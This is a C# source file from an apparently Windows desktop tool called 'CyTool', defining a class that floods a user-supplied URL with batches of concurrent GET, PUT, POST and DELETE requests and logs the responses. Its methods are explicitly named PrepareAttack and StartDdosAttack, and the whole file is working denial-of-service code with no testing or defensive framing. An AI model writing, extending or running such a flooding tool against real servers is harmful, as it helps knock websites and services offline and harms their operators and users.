using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Windows;

namespace CyTool.Models
{
    public class RequestModel
    {
        public string TargetUrl { get; set; }
        public int Count { get; set; }
        public ObservableCollection<string> RequestLogs { get; set; } = new ObservableCollection<string>();
        private static readonly HttpClient client = new HttpClient();

        public async Task<List<Task>> PrepareAttack()
        {
            if (string.IsNullOrEmpty(TargetUrl))
                throw new InvalidOperationException("Target URL is required.");

            var attacks = new List<Task>();

            for (int i = 0; i < Count; i++)
            {
                var attackGet = SendRequestAsync(() => client.GetAsync(TargetUrl), "GET");
                attacks.Add(attackGet);

                var attackPut = SendRequestAsync(() => client.PutAsync(TargetUrl, new StringContent("")), "PUT");
                attacks.Add(attackPut);

                var attackPost = SendRequestAsync(() => client.PostAsync(TargetUrl, new StringContent("")), "POST");
                attacks.Add(attackPost);

                var attackDelete = SendRequestAsync(() => client.DeleteAsync(TargetUrl), "DELETE");
                attacks.Add(attackDelete);
            }

            return attacks;
        }

        private async Task SendRequestAsync(Func<Task<HttpResponseMessage>> requestFunc, string method)
        {
            try
            {
                var response = await requestFunc();
                await Application.Current.Dispatcher.InvokeAsync(() =>
                {
                    RequestLogs.Add($"{method} request sent to {TargetUrl}, status code: {response.StatusCode}");
                });
            }
            catch (Exception ex)
            {
                await Application.Current.Dispatcher.InvokeAsync(() =>
                {
                    RequestLogs.Add($"Error during {method} request to {TargetUrl}: {ex.Message}");
                });
            }
        }

        public async Task StartDdosAttack(List<Task> attacks)
        {
            await Task.WhenAll(attacks);
        }
    }
}
